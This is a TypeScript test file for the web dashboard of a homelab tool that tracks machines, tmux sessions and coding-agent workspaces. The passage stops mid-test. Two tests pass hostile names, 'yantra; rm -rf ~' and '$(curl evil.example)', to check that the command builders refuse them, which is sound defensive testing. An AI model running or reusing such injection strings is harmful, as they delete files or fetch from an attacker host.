import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import {
  cleanup,
  fireEvent,
  render,
  screen,
  waitFor,
  within,
} from '@testing-library/react'
import type {
  AgentState,
  Beat,
  Check,
  Listed,
  Looked,
  Machine,
  MachineSessions,
  Readiness,
  Session,
  Workspace,
  WorkspaceStatus,
} from './api'
import {
  agentAct,
  type AgentRow,
  agentColumns,
  agentCommand,
  agentState,
  attachable,
  chosen,
  machineColumns,
  sessionColumns,
  sessionCommand,
  type SessionRow,
  workspaceColumns,
} from './columns'
import { renderHookQueried } from './test/inQuery'
import { renderRouted } from './test/inRouter'
import { Command } from './components/Command'
import { Readiness as ReadinessCard } from './components/Readiness'
import { Ready } from './routes/Machines'
import { DataTable } from './components/DataTable'
import { Section } from './components/Section'
import { useLooked } from './useLooked'
import App from './App'

afterEach(() => {
  cleanup()
  vi.unstubAllGlobals()
  // Y-189 sends two of these to `/machines`, and the path outlives the render.
  history.pushState(null, '', '/')
})

/** jsdom implements no `matchMedia` at all, so a width has to be supplied — and
 *  this one answers the query the component really asks rather than a fixed
 *  boolean, so the breakpoint stays the component's to choose. */
function viewport(width: number) {
  vi.stubGlobal('matchMedia', (query: string) => ({
    matches: width < Number(/([\d.]+)rem/.exec(query)?.[1]) * 16,
    addEventListener: () => {},
    removeEventListener: () => {},
  }))
}

// TanStack Router scrolls on navigation and jsdom implements no `scrollTo`.
beforeEach(() => {
  viewport(1280)
  vi.stubGlobal('scrollTo', () => {})
})

/** A workspace as `GET /api/workspaces` lists it, which since Y-141 says
 *  whether the file loaded. */
function listed(workspace: Workspace): Listed {
  return { loaded: 'yes', ...workspace }
}

function machine(overrides: Partial<Machine> = {}): Machine {
  return {
    name: 'cachyos-g14',
    dns_name: 'cachyos-g14.<tailnet>.ts.net.',
    os: 'linux',
    online: true,
    expired: false,
    last_seen: '2026-07-07T09:00:00Z',
    heartbeat: beat(),
    ...overrides,
  }
}

function beat(overrides: Partial<Beat> = {}): Beat {
  return {
    age_seconds: 3,
    arch: 'x86_64',
    labels: ['gpu', 'cuda', 'docker'],
    free_ram_mb: 19942,
    free_disk_mb: 214003,
    cpu_busy_pct: 15,
    power: 'ac',
    ...overrides,
  }
}

// A number stands for a status code the daemon answers instead of a body, which
// only `/api/workspaces/:name/status` does.
function stubFetch(answers: Record<string, Looked<unknown> | number>) {
  const asked = vi.fn((path: string) => {
    const answer = answers[path]
    return typeof answer === 'number'
      ? Promise.resolve({ ok: false, status: answer })
      : Promise.resolve({
          ok: true,
          status: 200,
          json: () => Promise.resolve(answer),
        })
  })
  vi.stubGlobal('fetch', asked)
  return asked
}

describe('the looked envelope', () => {
  it('says nobody has looked rather than drawing an empty fleet', () => {
    render(
      <Section title="Machines" query={{ looked: 'never' }}>
        {() => <p>a table</p>}
      </Section>,
    )
    expect(screen.getByText('Not looked at yet.')).toBeTruthy()
    expect(screen.queryByText('a table')).toBeNull()
  })

  it('renders a failure as the error and never as a table', () => {
    render(
      <Section
        title="Workspaces"
        query={{ looked: 'failed', age_seconds: 3, error: 'tailscaled is down' }}
      >
        {() => <p>a table</p>}
      </Section>,
    )
    expect(screen.getByText('tailscaled is down')).toBeTruthy()
    expect(screen.queryByText('a table')).toBeNull()
  })

  it('keeps the newlines in a multi-line parse error', () => {
    const error =
      'invalid workspace file\nTOML parse error at line 3, column 9\n  |\n3 | machine =\n  |         ^\n'
    render(
      <Section title="Workspaces" query={{ looked: 'failed', age_seconds: 1, error }}>
        {() => <p>a table</p>}
      </Section>,
    )
    const rendered = screen.getByText(error, { trim: false, collapseWhitespace: false })
    expect(rendered.textContent).toBe(error)
  })
})

describe('the machines table', () => {
  it('leaves LAST SEEN blank while a machine is online', async () => {
    const { container } = await renderRouted(
      <DataTable
        columns={machineColumns}
        rows={[machine()]}
        rowKey={(row) => row.name}
        empty="no machines on this tailnet"
      />,
    )
    const cells = [...container.querySelectorAll('td')].map((cell) => cell.textContent)
    expect(cells).toEqual(['cachyos-g14', 'linux', 'online', 'readybeat 3s', ''])
  })

  it('composes the status sentence and does not fold an expired key into offline', async () => {
    await renderRouted(
      <DataTable
        columns={machineColumns}
        rows={[machine({ online: false, expired: true, last_seen: '4d ago' })]}
        rowKey={(row) => row.name}
        empty="no machines on this tailnet"
      />,
    )
    expect(screen.getByText('offline, key expired')).toBeTruthy()
    expect(screen.getByText('4d ago')).toBeTruthy()
  })
})

/** ADR-0013 §7. The two tests that matter are the dishonest readings: a machine
 *  nothing has ever been heard from must not read as *asleep*, and one Tailscale
 *  still sees must not read as *ready* on the strength of that alone (R-23). */
describe('the four heartbeat states', () => {
  async function draw(one: Machine) {
    return renderRouted(
      <DataTable
        columns={machineColumns}
        rows={[one]}
        rowKey={(row) => row.name}
        empty="no machines on this tailnet"
      />,
    )
  }

  it('says never heard from, and never asleep, for a machine that has not beaten', async () => {
    const { container } = await draw(machine({ online: false, heartbeat: null }))

    expect(screen.getByText('never heard from')).toBeTruthy()
    expect(screen.queryByText('asleep or off')).toBeNull()
    // Not a zeroed reading either: there is no age to show, so none is shown.
    expect(container.textContent).not.toContain('beat')
  })

  // Y-192 puts the figure in its own `time`, so a matcher that reads only an
  // element's own text nodes sees `beat ` and never the age beside it.
  it('says up, but not reporting — and never ready — when only Tailscale sees it', async () => {
    const { container } = await draw(
      machine({ online: true, heartbeat: beat({ age_seconds: 92 }) }),
    )

    expect(screen.getByText('up, but not reporting')).toBeTruthy()
    expect(screen.queryByText('ready')).toBeNull()
    expect(container.textContent).toContain('beat 1m')
  })

  it('says asleep or off when the beats stopped and Tailscale lost it too', async () => {
    await draw(machine({ online: false, heartbeat: beat({ age_seconds: 92 }) }))

    expect(screen.getByText('asleep or off')).toBeTruthy()
    expect(screen.queryByText('never heard from')).toBeNull()
  })

  it('is ready inside the threshold and reports what the beat carried', async () => {
    const { container } = await draw(
      machine({
        heartbeat: beat({ age_seconds: 30, power: { battery: { percent: 42 } } }),
      }),
    )

    expect(screen.getByText('ready')).toBeTruthy()
    expect(container.textContent).toContain('beat 30s')
    expect(container.querySelector('[title*="battery, 42%"]')).toBeTruthy()
  })
})

describe('the workspaces table', () => {
  it('renders a null startup as a blank cell, not the word none', async () => {
    const workspace: Workspace = {
      name: 'yantra',
      machine: 'cachyos-g14',
      repo: '/home/<user>/Github/homelab/yantra',
      startup: null,
    }
    const { container } = await renderRouted(
      <DataTable
        columns={workspaceColumns(
          { looked: 'never' },
          { looked: 'never' },
          { looked: 'never' },
          () => {},
        )}
        rows={[workspace]}
        rowKey={(row) => row.name}
        empty="no workspaces yet"
      />,
    )
    const cells = [...container.querySelectorAll('td')].map((cell) => cell.textContent)
    expect(cells[4]).toBe('')
  })

  it('names the path a file goes in when the look succeeded and found nothing', async () => {
    await renderRouted(
      <DataTable
        columns={workspaceColumns(
          { looked: 'never' },
          { looked: 'never' },
          { looked: 'never' },
          () => {},
        )}
        rows={[]}
        rowKey={(row) => row.name}
        empty="no workspaces yet — make one at ~/.config/yantra/workspaces/<name>.toml"
      />,
    )
    expect(
      screen.getByText(
        'no workspaces yet — make one at ~/.config/yantra/workspaces/<name>.toml',
      ),
    ).toBeTruthy()
  })

  /** Y-141, and the mirror of the sessions test below: the broken file is named
   *  with its reason, and it costs the workspaces beside it nothing. */
  it('names a file that did not load without emptying the table', async () => {
    stubFetch({
      '/api/machines': { looked: 'never' },
      '/api/workspaces': {
        looked: 'ok',
        age_seconds: 2,
        data: [
          listed({
            name: 'yantra',
            machine: 'cachyos-g14',
            repo: '/home/<user>/Github/homelab/yantra',
            startup: null,
          }),
          {
            loaded: 'no',
            name: 'site',
            error:
              'workspace `site` at /home/<user>/.config/yantra/workspaces/site.toml has an empty `machine`',
          },
        ],
      },
      '/api/sessions': { looked: 'never' },
      '/api/workspaces/yantra/status': 404,
    })
    render(<App />)

    expect(await screen.findByText(/site unusable:/)).toBeTruthy()
    expect(screen.getByText(/empty `machine`/)).toBeTruthy()
    // Still a row, and still the only one — the failure is a note under the
    // table rather than a row with nothing to act on in it.
    expect(screen.getByText('yantra')).toBeTruthy()
    expect(screen.queryByText(/^no workspaces yet/)).toBeNull()
  })

  /** A per-workspace fetch for a file that did not load would ask about a name
   *  the agent class has no report for, and read back as `no report yet`. */
  it('asks for no agent status for a file that did not load', async () => {
    const asked = stubFetch({
      '/api/machines': { looked: 'never' },
      '/api/workspaces': {
        looked: 'ok',
        age_seconds: 2,
        data: [{ loaded: 'no', name: 'site', error: 'not valid TOML' }],
      },
      '/api/sessions': { looked: 'never' },
    })

    render(<App />)
    await screen.findByText(/site unusable:/)

    expect(
      asked.mock.calls.some(([path]) => String(path).includes('site/status')),
    ).toBe(false)
  })
})

/** D1 §2, built by Y-167. The row used to offer three verbs and make the reader
 *  pick; it now reads the agent state and offers the one that state is for. */
describe('the one verb a row computes', () => {
  const yantra: Workspace = {
    name: 'yantra',
    machine: 'cachyos-g14',
    repo: '/home/<user>/Github/homelab/yantra',
    startup: null,
  }

  function at(state: AgentState, workspace = yantra): WorkspaceStatus {
    return {
      workspace: workspace.name,
      machine: workspace.machine,
      reached: 'yes',
      status: state,
      session: null,
    }
  }

  it('offers no verb at all until something has been read', () => {
    // R-23: a row whose agent look has not landed is not a row that is down,
    // and Start is exactly the guess that would read as knowledge.
    expect(chosen(yantra, null)).toEqual({ does: 'wait', label: 'reading…' })
  })

  it('sends an unreachable machine to the machine, not at a verb that will fail', () => {
    const answer = chosen(yantra, {
      workspace: 'yantra',
      machine: 'cachyos-g14',
      reached: 'no',
      error: 'ssh: connect to host cachyos-g14 port 22: Connection refused',
    })
    expect(answer).toEqual({ does: 'fix', label: 'Fix' })
  })

  it('starts what is down and names the agent it will start', () => {
    expect(chosen(yantra, at({ state: 'no_session' }))).toEqual({
      does: 'post',
      verb: 'up',
      label: 'Start claude',
    })
    const editor = { ...yantra, startup: 'npm run dev' }
    expect(chosen(editor, at({ state: 'no_session' }, editor))).toEqual({
      does: 'post',
      verb: 'up',
      label: 'Start',
    })
  })

  it('opens a session that is alive rather than acting on it', () => {
    for (const state of ['running', 'no_agent'] as const) {
      expect(chosen(yantra, at({ state }))).toEqual({
        does: 'open',
        label: 'Open',
      })
    }
    expect(chosen(yantra, at({ state: 'unclear', because: 'R-2' }))).toEqual({
      does: 'open',
      label: 'Open',
    })
  })

  /** I-49 is the one state waiting on a person, and ADR-0011 says the person is
   *  never Yantra — so it gets its own word rather than a generic Open. */
  it('says a trust prompt is waiting for you and does not call it running', () => {
    expect(chosen(yantra, at({ state: 'awaiting_trust' }))).toEqual({
      does: 'open',
      label: 'Answer',
    })
  })

  it('resumes each of the four endings, and only where resume is allowed', () => {
    const endings = [
      { state: 'finished' },
      { state: 'stopped' },
      { state: 'crashed', exit_status: 1 },
      { state: 'killed', signal: 'SIGKILL' },
    ] as const
    for (const state of endings) {
      expect(chosen(yantra, at(state))).toEqual({
        does: 'post',
        verb: 'resume',
        label: 'Resume',
      })
      // ADR-0015 refuses resume for a workspace that starts something of its
      // own, so what is offered is the session it left behind.
      const editor = { ...yantra, startup: 'npm run dev' }
      expect(chosen(editor, at(state, editor))).toEqual({
        does: 'open',
        label: 'Open',
      })
    }
  })
})

/** Y-121. The buttons were 15 px past the right edge of a 390 px phone, in a
 *  749 px table inside 295 px of card. Below the breakpoint there is no table,
 *  so there is nothing to swipe sideways and nothing to fall off the end of. */
describe('a workspace row on a phone', () => {
  const site: Workspace = {
    name: 'personal-website',
    machine: 'bishwajeets-macbook-pro',
    repo: '/Users/<user>/Github/personal-website',
    startup: null,
  }

  async function draw() {
    return renderRouted(
      <DataTable
        columns={workspaceColumns(
          { looked: 'never' },
          { looked: 'never' },
          { looked: 'never' },
          () => {},
        )}
        rows={[site]}
        rowKey={(row) => row.name}
        empty="no workspaces yet"
      />,
    )
  }

  it('puts the verbs on the page instead of inside a table that scrolls', async () => {
    viewport(390)
    const { container } = await draw()

    fireEvent.click(
      screen.getByRole('button', { name: 'More for personal-website' }),
    )
    // `Overflow` is a lazy chunk (Y-167, and Y-194 split three more), so this
    // waits on a dynamic import rather than a render — R-24's species.
    for (const name of ['Start claude', 'Stop', 'Resume']) {
      expect(
        await screen.findByText(name, undefined, { timeout: 10_000 }),
      ).toBeTruthy()
    }
    expect(container.querySelector('table')).toBeNull()
    expect(container.querySelector('[data-slot="table-container"]')).toBeNull()
  })

  /** Y-167 took two columns away, and neither held a fact: the terminal and the
   *  edit form are verbs, and they moved into the overflow beside the others. */
  it('drops no fact — every one the row carried is still labelled', async () => {
    viewport(390)
    const { container } = await draw()

    const labels = [...container.querySelectorAll('dt')].map(
      (one) => one.textContent,
    )
    expect(labels).toEqual(['WORKSPACE', 'MACHINE', 'ACT', 'REPO', 'STARTUP'])
    expect(screen.getByText('/Users/<user>/Github/personal-website')).toBeTruthy()
  })

  it('keeps the table where there is room for one', async () => {
    viewport(1024)
    const { container } = await draw()

    expect(container.querySelector('table')).toBeTruthy()
  })
})

describe('the sessions section', () => {
  const session: Session = {
    name: 'yantra',
    windows: 2,
    // A client count: 0 is detached, and rendering it as "no" would be a lie.
    attached: 0,
    created: 'Thu Jul 30 13:02:31 2026',
  }
  const answers: MachineSessions[] = [
    { machine: 'cachyos-g14', reached: 'yes', sessions: [session] },
    { machine: 'pi', reached: 'no', error: 'connection timed out' },
  ]

  // Y-189 moved this group to `/machines`, where D3 §3.1 compares machines.
  it('renders an unanswered machine as unreachable and not as zero sessions', async () => {
    stubFetch({
      '/api/machines': { looked: 'never' },
      '/api/workspaces': { looked: 'never' },
      '/api/sessions': { looked: 'ok', age_seconds: 6, data: answers },
    })
    history.pushState(null, '', '/machines')
    render(<App />)

    expect(await screen.findByText('pi unreachable: connection timed out')).toBeTruthy()
    expect(screen.getByText('1 unclaimed on 1 of 2 machines')).toBeTruthy()
    expect(screen.queryByText('pi')).toBeNull()
  })

  it('reads its own age against the machine it is waiting for', async () => {
    stubFetch({
      '/api/machines': { looked: 'never' },
      '/api/workspaces': { looked: 'never' },
      '/api/sessions': { looked: 'ok', age_seconds: 44, data: answers },
    })
    history.pushState(null, '', '/machines')
    render(<App />)

    expect(await screen.findByText('waiting on pi')).toBeTruthy()
    expect(screen.queryByText('refresh stuck')).toBeNull()
  })

  it('renders attached as the client count rather than a yes or no', async () => {
    const { container } = await renderRouted(
      <DataTable
        columns={sessionColumns({ looked: 'never' })}
        rows={[{ machine: 'cachyos-g14', session }]}
        rowKey={(row) => row.machine}
        empty="no tmux sessions"
      />,
    )
    const cells = [...container.querySelectorAll('td')].map((cell) => cell.textContent)
    expect(cells).toEqual([
      'cachyos-g14',
      'yantra',
      '2',
      '0',
      'Thu Jul 30 13:02:31 2026',
      '',
      'TerminalKill',
    ])
  })

  /** Y-320. ADR-0022 made the socket's address a machine and a session, so a
   *  typo lands in a live shell; D6 §6.3 answers that by having the verb name
   *  what it will open before anything opens.
   *
   *  **Y-179 made it a link**, which is D6 §4.3's own word for it: the name is
   *  the one the row shipped with, and the role is what changed. */
  it('names the session and the machine the terminal would attach to', async () => {
    await renderRouted(
      <DataTable
        columns={sessionColumns({ looked: 'never' })}
        rows={[
          { machine: 'cachyos-g14', session },
          { machine: 'pi', session: { ...session, name: 'scratch' } },
        ]}
        rowKey={(row) => `${row.machine} ${row.session.name}`}
        empty="no tmux sessions"
      />,
    )

    expect(
      screen.getByRole('link', { name: 'Terminal for scratch on pi' }),
    ).toBeTruthy()
    expect(
      screen
        .getByRole('link', { name: 'Terminal for yantra on cachyos-g14' })
        .getAttribute('href'),
    ).toBe('/m/cachyos-g14/s/yantra')
  })

  /** Y-317. That the control asks first and reports an already-gone session as
   *  a fact is `forms.test.tsx`'s; what the column owes is carrying both, and
   *  naming the row it sits in rather than the first one on the page. */
  it('kills the session its own row names, and says one that was already gone', async () => {
    const asked = vi.fn()
    vi.stubGlobal(
      'fetch',
      vi.fn((path: string, init?: RequestInit) => {
        asked(init?.method, path)
        return Promise.resolve({
          ok: true,
          status: 200,
          json: () =>
            Promise.resolve({
              machine: 'pi',
              session: 'scratch',
              killed: false,
            }),
        })
      }),
    )
    await renderRouted(
      <DataTable
        columns={sessionColumns({ looked: 'never' })}
        rows={[
          { machine: 'cachyos-g14', session },
          { machine: 'pi', session: { ...session, name: 'scratch' } },
        ]}
        rowKey={(row) => `${row.machine} ${row.session.name}`}
        empty="no tmux sessions"
      />,
    )

    fireEvent.click(screen.getAllByRole('button', { name: 'Kill' })[1]!)
    expect(await screen.findByText('Kill scratch on pi?')).toBeTruthy()
    expect(asked).not.toHaveBeenCalled()

    fireEvent.click(screen.getByRole('button', { name: 'Kill it' }))

    expect(
      await screen.findByText(/No session named scratch was running on pi/),
    ).toBeTruthy()
    expect(asked).toHaveBeenCalledWith(
      'DELETE',
      '/api/machines/pi/sessions/scratch',
    )
  })
})

describe('useLooked', () => {
  it('maps a rejected fetch into a failed look rather than throwing', async () => {
    vi.stubGlobal(
      'fetch',
      vi.fn(() => Promise.reject(new Error('daemon is not running'))),
    )
    const { result } = renderHookQueried(() => useLooked('/api/machines'))

    await waitFor(() => expect(result.current.looked).toBe('failed'))
    expect(result.current).toMatchObject({
      looked: 'failed',
      error: expect.stringContaining('daemon is not running'),
    })
  })

  it('maps a non-200 into a failed look, since the fleet answers 200 either way', async () => {
    vi.stubGlobal(
      'fetch',
      vi.fn(() => Promise.resolve({ ok: false, status: 404 })),
    )
    const { result } = renderHookQueried(() => useLooked('/api/machines'))

    await waitFor(() => expect(result.current.looked).toBe('failed'))
    expect(result.current).toMatchObject({ error: expect.stringContaining('404') })
  })

  /** D3 §7.1. This asserted the bug: a question not yet asked is not a question
   *  answered *never*, and `never` is the daemon's word for having looked at
   *  nothing — not the browser's for not having asked. Y-190. */
  it('answers pending before the first response, and never says never', () => {
    stubFetch({ '/api/machines': { looked: 'ok', age_seconds: 0, data: [] } })
    const { result } = renderHookQueried(() => useLooked('/api/machines'))
    expect(result.current).toEqual({ looked: 'pending' })
  })
})

describe('the age reading', () => {
  const aged = (age_seconds: number, waiting?: string[]) =>
    render(
      <Section
        title="Machines"
        query={{ looked: 'ok', age_seconds, data: [] }}
        waiting={waiting}
      >
        {() => <p>a table</p>}
      </Section>,
    )

  it('says how old a fresh reading is and claims nothing else', () => {
    const { container } = aged(6)
    expect(container.textContent).toContain('as of 6s')
    expect(screen.queryByText('refresh stuck')).toBeNull()
  })

  // 30 s of sleep plus the one ConnectTimeout a concurrent sweep can pay.
  it('reads a sweep that waited out an unreachable machine as normal', () => {
    const { container } = aged(40)
    expect(container.textContent).toContain('as of 40s')
    expect(screen.queryByText('refresh stuck')).toBeNull()
  })

  it('says the refresh did not finish rather than that the data is old', () => {
    // Y-192's clock spells a minute as a minute, so the badge carries the
    // precision the figure stops carrying past 60 s.
    const { container } = aged(73)
    expect(container.textContent).toContain('as of 1m')
    expect(screen.getByText('refresh stuck')).toBeTruthy()
  })

  it('names the machine the sweep is waiting for rather than blaming the refresh', () => {
    aged(41, ['cachyos-g14'])
    expect(screen.getByText('waiting on cachyos-g14')).toBeTruthy()
    expect(screen.queryByText('refresh stuck')).toBeNull()
  })

  it('has nothing left to blame when every machine answered', () => {
    aged(41)
    expect(screen.getByText('refresh stuck')).toBeTruthy()
    expect(screen.queryByText(/waiting on/)).toBeNull()
  })

  // 30 + ServerAliveInterval=15 × ServerAliveCountMax=3, which is the longest
  // ssh itself will wait before giving up on a host that froze after connecting.
  it('stops excusing an age no ssh timeout is long enough to explain', () => {
    aged(76, ['cachyos-g14'])
    expect(screen.getByText('refresh stuck')).toBeTruthy()
  })

  it('does not call a daemon that has never looked stale', () => {
    render(
      <Section title="Machines" query={{ looked: 'never' }}>
        {() => <p>a table</p>}
      </Section>,
    )
    expect(screen.queryByText(/as of/)).toBeNull()
    expect(screen.queryByText('refresh stuck')).toBeNull()
  })
})

describe('the command a row carries', () => {
  function ok<T>(data: T): Looked<T> {
    return { looked: 'ok', age_seconds: 2, data }
  }

  const yantra: Workspace = {
    name: 'yantra',
    machine: 'cachyos-g14',
    repo: '/home/<user>/Github/homelab/yantra',
    startup: null,
  }
  const session: Session = {
    name: 'yantra',
    windows: 1,
    attached: 0,
    created: 'Thu Jul 30 13:02:31 2026',
  }
  const row: SessionRow = { machine: 'cachyos-g14', session }
  const running = ok<MachineSessions[]>([
    { machine: 'cachyos-g14', reached: 'yes', sessions: [session] },
  ])

  it('offers a terminal only when the session was really seen', () => {
    expect(attachable(yantra, running)).toBe(true)

    const idle = ok<MachineSessions[]>([
      { machine: 'cachyos-g14', reached: 'yes', sessions: [] },
    ])
    expect(attachable(yantra, idle)).toBe(false)
  })

  // Y-113 made `up` a button; Y-130 made the last paste in this row one too.
  it('offers nothing where a look failed, and nothing where nothing is open', () => {
    const failed: Looked<MachineSessions[]> = {
      looked: 'failed',
      age_seconds: 1,
      error: 'tailscaled is down',
    }
    expect(attachable(yantra, failed)).toBe(false)
    expect(attachable(yantra, { looked: 'never' })).toBe(false)
  })

  it('does not read an unreachable machine as a machine with a session', () => {
    const unreachable = ok<MachineSessions[]>([
      { machine: 'cachyos-g14', reached: 'no', error: 'connection timed out' },
    ])
    expect(attachable(yantra, unreachable)).toBe(false)
  })

  it('still refuses a name the daemon would not have allowed a command for', () => {
    const hostile = { ...yantra, name: 'yantra; rm -rf ~' }
    expect(sessionCommand({ machine: 'cachyos-g14', session: { ...session, name: hostile.name } }, ok([hostile]))).toBeNull()
    expect(agentCommand({ workspace: hostile, status: null })).toBeNull()
  })

  it('builds a session row command from the workspace name, never from tmux', () => {
    expect(sessionCommand(row, ok([yantra]))).toBe('yantra attach yantra')

    const hostile: SessionRow = {
      machine: 'cachyos-g14',
      session: { ...session, name: '$(curl evil.example)' },
    }
    expect(sessionCommand(hostile, ok([yantra]))).toBeNull()
  })

  it('does not match a workspace of the same name on another machine', () => {
    const elsewhere: SessionRow = { ...row, machine: 'bishwajeets-macbook-pro' }
    expect(sessionCommand(elsewhere, ok([yantra]))).toBeNull()
    expect(sessionCommand(row, { looked: 'never' })).toBeNull()
  })

  it('puts the terminal behind the overflow, as a link and not a callback', async () => {
    await renderRouted(
      <DataTable
        columns={workspaceColumns(
          running,
          { looked: 'never' },
          { looked: 'never' },
          () => {},
        )}
        rows={[yantra]}
        rowKey={(one) => one.name}
        empty="no workspaces yet"
      />,
    )
    fireEvent.click(screen.getByRole('button', { name: 'More for yantra' }))

    // A link rather than a handler, so the row obeys a middle click the way
    // every other route in this page does.
    const open = await screen.findByText('Open terminal')
    expect(open.closest('a')?.getAttribute('href')).toBe('/w/yantra')
    expect(machineColumns.some((column) => column.header === 'COMMAND')).toBe(false)
  })
})

describe('copying a command', () => {
  afterEach(() => {
    Reflect.deleteProperty(navigator, 'clipboard')
  })

  it('selects the command and says so on the origin the daemon actually serves', async () => {
    // jsdom offers neither navigator.clipboard nor execCommand, which is what a
    // plain-HTTP 100.64.0.0/10 address looks like: not a secure context.
    render(<Command command="yantra up yantra" />)
    fireEvent.click(screen.getByRole('button'))

    expect(await screen.findByText('selected — copy it yourself')).toBeTruthy()
    expect(window.getSelection()?.toString()).toBe('yantra up yantra')
  })

  it('writes the command itself when a secure context grants a clipboard', async () => {
    const writeText = vi.fn(() => Promise.resolve())
    Object.defineProperty(navigator, 'clipboard', {
      value: { writeText },
      configurable: true,
    })

    render(<Command command="yantra attach yantra" />)
    fireEvent.click(screen.getByRole('button'))

    expect(await screen.findByText('copied')).toBeTruthy()
    expect(writeText).toHaveBeenCalledWith('yantra attach yantra')
  })
})

/** D2 §3.1's checks drawn rather than run (Y-168). The daemon serves the reading
 *  and this page names the states, which is the same split `/api/machines` and
 *  `reporting()` already have — and the heartbeat check is where it bites. */
describe('the readiness cards', () => {
  function check(one: Partial<Check> = {}): Check {
    return {
      check: 'reachable',
      state: 'present',
      detail: 'a command ran there and reported its own status',
      ...one,
    }
  }

  const report = (checks: Check[]): Readiness => ({
    machine: 'cachyos-g14',
    checks,
  })

  it('never paints a question that could not be asked as a thing that is missing', () => {
    render(
      <ReadinessCard
        machine={machine()}
        report={report([
          check({ check: 'tmux', state: 'absent', detail: 'no tmux there' }),
          check({
            check: 'provider-auth',
            state: 'unknown',
            detail: 'could not be asked: ssh said nothing',
          }),
        ])}
      />,
    )

    // R-23: the two send a reader to different places, so they may not share a
    // tone — one installs something, the other goes and looks.
    const [absent, unknown] = [...document.querySelectorAll('[data-slot="badge"]')]
    expect(absent?.className).not.toBe(unknown?.className)
    expect(screen.getByText('no tmux there')).toBeTruthy()
    expect(screen.getByText(/could not be asked/)).toBeTruthy()
  })

  /** The daemon answers `heartbeat` *present* for any beat that ever arrived and
   *  names none of ADR-0013 §7's states. If the card drew that state it would
   *  say ready beside a machines table saying asleep or off. */
  it('does not read a beat that stopped an hour ago as a machine that is ready', () => {
    const stale = machine({ online: false, heartbeat: beat({ age_seconds: 3600 }) })
    render(
      <ReadinessCard
        machine={stale}
        report={report([
          check({ check: 'heartbeat', state: 'present', detail: 'a beat arrived 3600s ago' }),
        ])}
      />,
    )

    // The words the machines table uses for the same machine, not the daemon's.
    expect(screen.getByText(/nothing has arrived for 3600s/)).toBeTruthy()
    expect(screen.queryByText('a beat arrived 3600s ago')).toBeNull()
  })

  it('still reads a beat inside the threshold as present', () => {
    render(
      <ReadinessCard
        machine={machine()}
        report={report([
          check({ check: 'heartbeat', state: 'present', detail: 'a beat arrived 3s ago' }),
        ])}
      />,
    )
    expect(screen.getByText(/19942 MB free/)).toBeTruthy()
  })

  /** The join is the machine name, and a report the tailnet list does not hold
   *  cannot be reconciled at all — which is unknown, never absent. */
  it('leaves the beat unknown for a machine the tailnet does not list', () => {
    render(
      <ReadinessCard
        machine={undefined}
        report={report([check({ check: 'heartbeat', state: 'present', detail: 'a beat arrived 3s ago' })])}
      />,
    )
    expect(screen.getByText(/lists no machine of that name/)).toBeTruthy()
  })

  it('says nothing has been asked rather than drawing an empty fleet', async () => {
    await renderRouted(<Ready machines={{ looked: 'never' }} reports={[]} />)
    expect(screen.getByText(/no workspace names a machine/)).toBeTruthy()
  })

  /** A machine no workspace names 404s, which `useLooked` reads as a failed
   *  look — and *the look broke* is a different sentence from *nothing asked*. */
  it('reads a machine no workspace names as not asked, not as a broken look', async () => {
    stubFetch({
      '/api/machines': { looked: 'ok', age_seconds: 1, data: [machine({ name: 'pi' })] },
      '/api/workspaces': { looked: 'ok', age_seconds: 1, data: [] },
      '/api/sessions': { looked: 'never' },
      '/api/machines/pi/readiness': 404,
    })
    history.pushState(null, '', '/m/pi')
    render(<App />)

    expect(await screen.findByText(/No workspace names this machine/)).toBeTruthy()
    expect(screen.queryByText('The look failed.')).toBeNull()
    history.pushState(null, '', '/')
  })
})

describe('the agents section', () => {
  const yantra: Workspace = {
    name: 'yantra',
    machine: 'cachyos-g14',
    repo: '/home/<user>/Github/homelab/yantra',
    startup: null,
  }

  function reported(state: AgentState, workspace = yantra): AgentRow {
    return {
      workspace,
      status: {
        workspace: workspace.name,
        machine: workspace.machine,
        reached: 'yes',
        status: state,
        session: null,
      },
    }
  }

  const unreachable: AgentRow = {
    workspace: yantra,
    status: {
      workspace: 'yantra',
      machine: 'cachyos-g14',
      reached: 'no',
      error: 'ssh: connect to host cachyos-g14 port 22: Connection refused',
    },
  }

  function agents(rows: AgentRow[]) {
    render(
      <DataTable
        columns={agentColumns}
        rows={rows}
        rowKey={(row) => row.workspace.name}
        empty="no workspaces yet"
      />,
    )
  }

  function stubPost(status: number, body: unknown) {
    const posted = vi.fn()
    vi.stubGlobal(
      'fetch',
      vi.fn((path: string, init?: RequestInit) => {
        posted(
          path,
          init?.body === undefined ? undefined : JSON.parse(String(init.body)),
        )
        return Promise.resolve({
          ok: status < 400,
          status,
          json: () => Promise.resolve(body),
          text: () => Promise.resolve(String(body)),
        })
      }),
    )
    return posted
  }

  it('reads a shell session as ordinary and a contradiction as wrong', () => {
    const shell = agentState(reported({ state: 'no_agent' }).status)
    expect(shell.tone).not.toBe('bad')
    expect(shell.label).toContain('shell')

    // Y-193: a contradiction is no longer *wrong*, it is *we do not know*.
    // D3 §6.2 gives `unclear` no colour at all, so the dashed mark carries it.
    const ghost = agentState(
      reported({ state: 'unclear', because: 'the pane is alive' }).status,
    )
    expect(ghost.tone).toBe('unknown')
  })

  it('renders what told an ending apart rather than flattening it to a label', () => {
    const rows: AgentRow[] = [
      reported({ state: 'crashed', exit_status: 3 }),
      reported(
        { state: 'killed', signal: 'term' },
        { ...yantra, name: 'shot' },
      ),
      reported(
        {
          state: 'unclear',
          because: 'the pane is alive but claude knows of no agent',
        },
        { ...yantra, name: 'ghost' },
      ),
    ]
    render(
      <DataTable
        columns={agentColumns}
        rows={rows}
        rowKey={(row) => row.workspace.name}
        empty="no workspaces yet"
      />,
    )

    expect(screen.getByText('crashed — exit 3')).toBeTruthy()
    // I-48: the same tmux prints a signal as `15` on Linux and `term` on macOS,
    // so it is passed through rather than named.
    expect(screen.getByText('killed — term')).toBeTruthy()
    expect(
      screen.getByText('the pane is alive but claude knows of no agent'),
    ).toBeTruthy()
  })

  it('names the machine that did not answer instead of reporting no agent', () => {
    render(
      <DataTable
        columns={agentColumns}
        rows={[unreachable]}
        rowKey={(row) => row.workspace.name}
        empty="no workspaces yet"
      />,
    )

    expect(screen.getByText('machine did not answer')).toBeTruthy()
    expect(screen.getByText(/Connection refused/)).toBeTruthy()
    expect(screen.queryByText(/yantra (resume|attach|up)/)).toBeNull()
  })

  it('picks the verb the state is for, and attach where there is no route', () => {
    expect(agentAct(reported({ state: 'no_session' }))).toBe('up')
    for (const state of ['finished', 'stopped'] as const) {
      expect(agentAct(reported({ state }))).toBe('resume')
    }
    expect(agentAct(reported({ state: 'crashed', exit_status: 1 }))).toBe(
      'resume',
    )
